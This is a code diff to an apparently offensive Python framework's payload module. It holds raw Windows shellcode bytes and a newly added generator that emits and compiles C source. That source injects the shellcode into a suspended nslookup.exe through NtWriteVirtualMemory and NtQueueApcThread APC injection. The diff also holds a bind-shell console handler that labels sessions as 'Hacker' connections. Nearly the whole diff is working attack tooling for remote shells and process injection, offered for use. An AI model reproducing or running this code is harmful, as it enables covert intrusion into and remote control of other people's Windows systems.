@@ -1,7 +1,10 @@
 # -*- coding: UTF-8 -*-
+import genericpath
 from SpiritCore.Payload import *
 from SpiritCore.FCmd import *
 from SpiritCore.Lib.Socket import *
+from SpiritCore.Lib.Build import *
+from shutil import copyfile
 import socket
 from struct import pack
 class Payloads(Payload):
@@ -59,13 +62,171 @@ class Payloads(Payload):
         buf += b"\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83"
         buf += b"\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
         buf += b"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
-        #@print("s")
-        SC = b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x78\x10\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x83\xec\x20\x8d\x34\x24\x66\xb9\x94\x02\x8b\x53\x1c\x01\xfa\x8b\x04\x0a\x01\xf8\x89\x06\x66\xb9\x68\x04\x8b\x04\x0a\x01\xf8\x89\x46\x04\x66\xb9\xf0\x0c\x8b\x04\x0a\x01\xf8\x31\xc9\x68\x6c\x6c\x41\x41\x66\x89\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x8d\x1c\x24\x53\xff\xd0\x89\xc7\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x8b\x53\x1c\x01\xfa\x31\xc9\x66\xb9\xc8\x01\x8b\x04\x0a\x01\xf8\x89\x46\x08\x66\xb9\x88\x01\x8b\x04\x0a\x01\xf8\x89\x46\x0c\x8b\x42\x04\x01\xf8\x89\x46\x10\x8b\x42\x30\x01\xf8\x89\x46\x14\x8b\x02\x01\xf8\x89\x46\x18\x8b\x42\x50\x01\xf8\x89\x46\x1c\x66\xb9\x90\x01\x29\xcc\x8d\x1c\x24\x66\xb9\x02\x02\x53\x51\xff\x56\x08\x31\xc9\x51\x51\x51\xb1\x06\x51\x83\xe9\x05\x51\x41\x51\xff\x56\x0c\x89\xc7\x99\xb2\x02\x52\x4a\x52\x8d\x0c\x24\xb2\x04\x51\x52\x66\xba\xff\xff\x52\x57\xff\x56\x1c\x99\x52\x52\x52\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02" + (pack(">H", int(self.Parameate['Port'])) )+ b"\x8d\x0c\x24\xb2\x10\x52\x51\x57\xff\x56\x10\x99\x42\x52\x57\xff\x56\x14\x99\x52\x52\x52\x52\xb2\x10\x8d\x0c\x24\x52\x8d\x1c\x24\x53\x51\x57\xff\x56\x18\x89\xc7\x99\x83\xec\x10\x8d\x1c\x24\x57\x57\x57\x52\x52\xb2\xff\x42\x52\x99\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\xb2\x44\x52\x8d\x0c\x24\x99\x68\x65\x78\x65\x41\x88\x54\x24\x03\x68\x63\x6d\x64\x2e\x8d\x04\x24\x53\x51\x52\x52\x52\x42\x52\x99\x52\x52\x50\x52\xff\x16\x50\xff\x56\x04"
-        #print("s")
+        #@write("s")
+        #write("s")
 
         #ShellCode=str(buf)
         self.Size=len(buf)
         return buf
+    def shellcodecpphex(self,xor):
+        shellcode = ''
+        try:
+            for code in xor:
+                code_hex = hex(code)
+                code_hex = code_hex.replace('0x', '')
+                if (len(code_hex) == 1):
+                    code_hex = '0' + code_hex
+                shellcode += r'\x' + code_hex
+        except Exception as e:
+            print(e)
+            
+        shellcodes = "char shellcode[] = \"" + shellcode + "\";"
+        return shellcodes
+    def GenerateFile(self,Parame,FilePath,FileType):
+        Object = CMAKE()
+        Object.SourceCode="""#include<windows.h>
+#include<stdio.h>
+typedef struct _UNICODE_STRING
+{
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _PS_ATTRIBUTE
+{
+    ULONG  Attribute;
+    SIZE_T Size;
+    union
+    {
+        ULONG Value;
+        PVOID ValuePtr;
+    } u1;
+    PSIZE_T ReturnLength;
+} PS_ATTRIBUTE, * PPS_ATTRIBUTE;
+
+typedef struct _PS_ATTRIBUTE_LIST
+{
+    SIZE_T       TotalLength;
+    PS_ATTRIBUTE Attributes[1];
+} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
+
+typedef struct _OBJECT_ATTRIBUTES
+{
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef struct _CLIENT_ID
+{
+    void* UniqueProcess;
+    void* UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+typedef struct _IO_STATUS_BLOCK
+{
+    union
+    {
+        NTSTATUS Status;
+        VOID* Pointer;
+    };
+    ULONG_PTR Information;
+} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
+
+typedef VOID(NTAPI* PIO_APC_ROUTINE) (
+    IN PVOID            ApcContext,
+    IN PIO_STATUS_BLOCK IoStatusBlock,
+    IN ULONG            Reserved);
+
+typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
+typedef NTSTATUS(NTAPI* pNtOpenThread)(PHANDLE ThreadHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID);
+typedef NTSTATUS(NTAPI* pNtSuspendThread)(HANDLE ThreadHandle, PULONG SuspendCount);
+typedef NTSTATUS(NTAPI* pNtAlertResumeThread)(HANDLE ThreadHandle, PULONG SuspendCount);
+typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);
+typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
+typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext OPTIONAL, PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, ULONG ApcReserved OPTIONAL);
+
+int main()
+{
+
+    %s
+
+    // Create a 64-bit process: 
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    LPVOID allocation_start;
+    SIZE_T allocation_size = sizeof(shellcode);
+    
+    HANDLE hProcess, hThread;
+    NTSTATUS status;
+
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+    char cmd[] = \"C:\\\\Windows\\\\System32\\\\nslookup.exe\";
+
+    if (!CreateProcess(
+        cmd,                            // Executable
+        NULL,                           // Command line
+        NULL,                           // Process handle not inheritable
+        NULL,                           // Thread handle not inheritable
+        FALSE,                          // Set handle inheritance to FALSE 
+        CREATE_SUSPENDED |              // Create Suspended for APC Injection
+        CREATE_NO_WINDOW,               // Do Not Open a Window
+        NULL,                           // Use parent's environment block
+        NULL,                           // Use parent's starting directory 
+        &si,                            // Pointer to STARTUPINFO structure
+        &pi                             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
+    )) {
+        DWORD errval = GetLastError();
+    }
+    WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize. 
+    hProcess = pi.hProcess;
+    hThread = pi.hThread;
+
+    // MEDIUM LEVEL API:
+
+    FARPROC fpAddresses[6] = {
+        GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\"),
+        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtAllocateVirtualMemory\"),
+        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtWriteVirtualMemory\"),
+        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtSuspendThread\"),
+        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtAlertResumeThread\"),
+        GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtQueueApcThread\")
+    };
+
+    pNtAllocateVirtualMemory fNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fpAddresses[1];
+    pNtWriteVirtualMemory fNtWriteVirtualMemory = (pNtWriteVirtualMemory)fpAddresses[2];
+    pNtSuspendThread fNtSuspendThread = (pNtSuspendThread)fpAddresses[3];
+    pNtAlertResumeThread fNtAlertResumeThread = (pNtAlertResumeThread)fpAddresses[4];
+    pNtQueueApcThread fNtQueueApcThread = (pNtQueueApcThread)fpAddresses[5];
+
+    allocation_start = NULL;
+    fNtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PULONG)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    fNtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
+    fNtQueueApcThread(hThread, (PIO_APC_ROUTINE)allocation_start, allocation_start, NULL, NULL);
+    fNtAlertResumeThread(hThread, NULL);
+
+
+}
+        """%self.shellcodecpphex(self.Generate())
+        Filename=Object.Generate()
+        if(Filename==""):
+            print("Generate Error.....")
+        else:
+            print("Generate:%s"%FilePath)
+            copyfile(Filename,FilePath)
+
+
+
+
+
+
+
     def SessionInfo(self):
         return "%s:%s  <----- Hacker"%(self.Parameate['TargetIp'],self.Parameate['Port'])
     def Console(self,SessionSocket):
@@ -92,7 +253,7 @@ class RecvClass (threading.Thread):
                 Text=self.SocketObject.Recv(4096*4096)
                 write(Text)
             except Exception as error:
-                #print(error)
+                #write(error)
                 #write("Warrior")
                 break
 
@@ -118,7 +279,7 @@ class Bind_Shell(Cmd):
 
         #write(self.Socket.Recv())
         #write(self.Socket.Recv())
-        #print("sss")
+        #write("sss")
         #write(str(self.Socket.recv(4096 * 4096), encoding="gbk"))
         while not stop:
             line = ""
@@ -154,7 +315,7 @@ class Bind_Shell(Cmd):
                     
                     
             except Exception as error:
-                print(error)
+                write(error)
                 return
 
 
